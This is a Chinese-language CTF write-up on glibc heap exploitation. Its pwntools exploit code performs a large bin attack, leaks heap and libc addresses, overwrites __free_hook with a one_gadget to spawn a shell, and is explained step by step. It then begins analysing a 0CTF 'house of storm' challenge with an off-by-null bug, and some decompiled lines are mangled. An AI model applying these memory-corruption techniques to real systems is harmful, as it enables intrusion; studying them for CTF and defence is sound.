    # large bin attack
    edit(0xb, p64(chunk1_addr))             # victim  bk_nextsize
    edit(0x1, p64(0x0)+p64(chunk1_addr))    # target  
    ​
    chunk2  = p64(0x0)
    chunk2 += p64(0x0)
    chunk2 += p64(0x421)
    chunk2 += p64(0x0)
    chunk2 += p64(0x0)
    chunk2 += p64(chunk1_addr)   #fd_nextsize
    edit(0x3, chunk2) # chunk2
    ​
    chunk1  = ''
    chunk1 += p64(0x0)
    chunk1 += p64(0x0)
    chunk1 += p64(0x411)
    chunk1 += p64(target_addr-0x18)
    chunk1 += p64(target_addr-0x10)
    chunk1 += p64(victim_addr)
    chunk1 += p64(chunk2_addr)
    ​
    edit(0x2, chunk1) # chunk1
    ​
    edit(0x7, '7'*0x198+p64(0x410)+p64(0x411)) #dao da chunk1
    debug(0)
    dele(0x6) 
    dele(0x3)
    # debug(0)
    add(0x3f0, '3'*0x30+p64(0xdeadbeefdeadbeef)) # chunk1, arbitrary write !!!!!!!
    add(0x60,  '6'*0x60 ) #
    show(0x3)
    io.recvuntil('3'*0x30)
    io.recv(8)
    LIBC = u64(io.recv(6)+'\x00\x00')-0x3c4be8
    log.info("libc base 0x%016x" % LIBC)
    junk  = ''
    junk += '3'*0x30
    junk += p64(0x81)
    junk += p64(LIBC+0x3c4be8)
    junk += p64(HEAP+0x300)
    junk  = junk.ljust(0xa8, 'A')
    junk += p64(0x80)
    recovery  = ''
    recovery += junk
    recovery += p64(0x80) # 0x4->size
    recovery += p64(0x60) # 0x4->fd
    ​
    dele(0x5)
    dele(0x4)
    # debug(0)
    edit(0x3, recovery) # victim, start from HEAP+0x158
    add(0x60,  '4'*0x60) #
    recovery  = ''
    recovery += junk
    recovery += p64(0x70) # 0x4->size
    recovery += p64(0x0) # 0x4->fd
    edit(0x3, recovery) # victim, start from HEAP+0x158
    ​
    add(0x40,  '5'*0x30 ) #
    dele(0x5)
    # debug(0)
    recovery  = ''
    recovery += '3'*0x30
    recovery += p64(0x61)
    recovery += p64(LIBC+0x3c4b50)
    edit(0x3, recovery) # victim, start from HEAP+0x158
    add(0x40,  '5'*0x30 ) #
    ​
    add(0x40,  p64(LIBC+0x3c5c50)) #
    ​
    # recovery
    edit(0xb, p64(HEAP+0x7e0))
    dele(0x6)
    # debug(0)
    add(0x300, '\x00') #
    add(0x300, '\x00') #
    add(0x300, '\x00') #
    add(0x300, '\x00') #
    add(0x300, '/bin/sh') #
    dele(0x1)
    add(0x300, '\x00'*0x1d0+p64(LIBC+0x4526a)) #
    # debug(0)
    dele(15)
    ​
    io.interactive()
1、首先是泄露堆地址：
    add(0x60,  '0'*0x60 ) #
    add(0x60,  '1'*0x60 ) #
    add(0x60,  '2'*0x60 ) #
    add(0x60,  '3'*0x60 ) #
    add(0x60,  '4'*0x60 ) #
    add(0x60,  '5'*0x60 ) #
    add(0x60,  '6'*0x60 ) #
    add(0x3f0, '7'*0x3f0) # playground
    add(0x30,  '8'*0x30 )
    add(0x3e0, '9'*0x3d0) # sup
    add(0x30,  'a'*0x30 )
    add(0x3f0, 'b'*0x3e0) # victim
    add(0x30,  'c'*0x30 )
    ​
    dele(0x9)
    dele(0xb)
    dele(0x0)
    # debug(0)
    add(0x400, '0'*0x400) #bk_nextsize
    ​
    # leak
    show(0xb)
    io.recvuntil('num: ')
    print(hex(c_uint32(int(io.recvline()[:-1])).value))
    io.recvuntil('description:')
    HEAP = u64(io.recvline()[:-1]+'\x00\x00')-0x7e0
    log.info("heap base 0x%016x" % HEAP)
可以看到正好是description位置处，利用bins的回收重分配机制，我们实现了第一步。
2、利用堆地址进行largebin的attack：
记清楚这4个我们待会要操作的堆块
    target_addr = HEAP+0xb0     # 1
    chunk1_addr = HEAP+0x130    # 2
    chunk2_addr = HEAP+0x1b0    # 3
    victim_addr = HEAP+0xc30    # b
chunk1和chunk2是我们需要伪造的fake_chunk。
    edit(0xb, p64(chunk1_addr))
    edit(0x1, p64(0x0)+p64(chunk1_addr))
这一步实现了修改bk_nextsize，链接到HEAP+0x130位置处，同时把指针写入到target堆地址中
    chunk2  = p64(0x0)
    chunk2 += p64(0x0)
    chunk2 += p64(0x421)
    chunk2 += p64(0x0)
    chunk2 += p64(0x0)
    chunk2 += p64(chunk1_addr)   #fd_nextsize
    edit(0x3, chunk2) # chunk2
    在0x1b0的位置实现了fake_chunk2的伪造，fd_nextsize指向0x130
    chunk1  = ''
    chunk1 += p64(0x0)
    chunk1 += p64(0x0)
    chunk1 += p64(0x411)
    chunk1 += p64(target_addr-0x18)
    chunk1 += p64(target_addr-0x10)
    chunk1 += p64(victim_addr)
    chunk1 += p64(chunk2_addr)
    ​
    edit(0x2, chunk1) # chunk1
这里在0x130位置处实现了fake_chunk1的伪造，同时把FD,BK,fd_nextsize和bk_nextsize都伪造好了，这样largebin的纵向列表就构造好了，横向列表也构造好了。这里重点是纵向列表，如图：
    edit(0x7, '7'*0x198+p64(0x410)+p64(0x411))
写入size，刚好前一个是HEAP+0x130（size为0x410）。
再次申请时，根据从小到大遍历，会找到HEAP+0x130的fake_chunk堆块并取出来，实现unlink操作，那么就可以控制这个HEAP+0x130处的堆块了，从而有很大的溢出空间，就可以泄露地址了，把下一个的size位覆盖一下成0xdeadbeefdeadbeef，变成没有0截断，然后再次申请一个0x60，让0x7f的地址写入到堆块的FD指针，即可泄露：
    add(0x3f0, '3'*0x30+p64(0xdeadbeefdeadbeef)) # chunk1, arbitrary write !!!!!!!
    add(0x60,  '6'*0x60 ) #
    # debug(0)
    show(0x3)
    io.recvuntil('3'*0x30)
    io.recv(8)
    LIBC = u64(io.recv(6)+'\x00\x00')-0x3c4be8
    log.info("libc base 0x%016x" % LIBC)
接着我们修复下堆块，把0x80的堆块的FD改为0x60，下一次再次申请0x60的堆块，就会把0x60的数字写入到main_arena+56处，从而可以伪造出一个0x60大小的chunk块的size。
    junk  = ''
    junk += '3'*0x30
    junk += p64(0x81)
    junk += p64(LIBC+0x3c4be8)
    junk += p64(HEAP+0x300)
    junk  = junk.ljust(0xa8, 'A')
    junk += p64(0x80)
    recovery  = ''
    recovery += junk
    recovery += p64(0x80) # 0x4->size
    recovery += p64(0x60) # 0x4->fd
    ​
    dele(0x5)
    dele(0x4)
    debug(0)
    edit(0x3, recovery)
伪造size为0x70，FD置为0,并切割，使得不满足0x60的size
    recovery  = ''
    recovery += junk
    recovery += p64(0x70) # 0x4->size
    recovery += p64(0x0) # 0x4->fd
    edit(0x3, recovery) 
    add(0x40,  '5'*0x30 )
再释放掉5号块（已修改为0x60大小），接着往它的FD写入刚刚伪造的0x60size的main_arena上的chunk，再申请2次即可往fake_chunk写入内容，也就是写入free_hook上方一些的topchunk地址，这样就实现了改heap下的topchunk的地址，下一次申请时就会从main_arena的topchunk地址处开始切割
    dele(0x5)
    recovery  = ''
    recovery += '3'*0x30
    recovery += p64(0x61)
    recovery += p64(LIBC+0x3c4b50)
    edit(0x3, recovery)
    add(0x40,  '5'*0x30 ) #
    add(0x40,  p64(LIBC+0x3c5c50))
现在修改后：
接下来一路申请就可以一步步靠近我们的free_hook了，申请到了free_hook的区域后，改写为system，再free一个有binsh的堆块既可实现getshell。
复原伪造的largebin的attack，并腾出空间：
    edit(0xb, p64(HEAP+0x7e0))
    dele(0x6)
最后是改free_hook
    add(0x300, '\x00') #
    add(0x300, '\x00') #
    add(0x300, '\x00') #
    add(0x300, '\x00') #
    add(0x300, '/bin/sh') #
    dele(0x1)
    add(0x300, '\x00'*0x1d0+p64(LIBC+0x4526a)) 
    dele(15)
    io.interactive()
以上就是对于这题的一个解答，总结如下：
通过伪造largebin，再申请出largebin进行溢出攻击，然后结合fastbin的attack，修改topchunk的地址，接着改free_hook为onegadget。
下一题：
0CTF的一道house 0f storm：
这道题质量很高
先查看保护机制：
保护全开，接着ida分析程序:
    signed __int64 initial()
    {
      signed int i; // [rsp+8h] [rbp-18h]
      int fd; // [rsp+Ch] [rbp-14h]
    ​
      setvbuf(stdin, 0LL, 2, 0LL);
      setvbuf(_bss_start, 0LL, 2, 0LL);
      alarm(0x3Cu);
      puts(
        "    __ __ _____________   __   __    ___    ____\n"
        "   / //_// ____/ ____/ | / /  / /   /   |  / __ )\n"
        "  / , 12 && size  15 || !xorsize(mmap, mmap[idx + 2].size) )
        return puts("Invalid Index");
      printf("Size: ");
      size = get_long();
      if ( size  (xorsize(mmap, mmap[idx + 2].size) - 0xC) )
        return puts("Invalid Size");
      printf("Content: ");
      v2 = xorchunk(mmap, mmap[idx + 2LL].ptr);
      read_n(v2, size);
      v3 = v2 + size;
      *v3 = 'ROTSPAEH';
      *(v3 + 2) = 'II_M';
      v3[12] = 0;          //0ffbynull
      return printf("Chunk %d Updated\n", idx);
    }
这里很明显的漏洞，就是输入满了后，有个0ffbynull漏洞，但是每次输入完，都会在末尾加上12个字节才能触发0ffbynull
3、Free
    int __fastcall Delete(chunk *mmap)
    {
      void *ptr; // rax
      signed int idx; // [rsp+1Ch] [rbp-4h]
    ​
      printf("Index: ");
      idx = get_long();
      if ( idx  15 || !xorsize(mmap, mmap[idx + 2].size) )
        return puts("Invalid Index");
      ptr = xorchunk(mmap, mmap[idx + 2LL].ptr);
      free(ptr);
      mmap[idx + 2LL].ptr = xorchunk(mmap, 0LL);
      mmap[idx + 2].size = xorsize(mmap, 0LL);
      return printf("Chunk %d Deleted\n", idx);
    }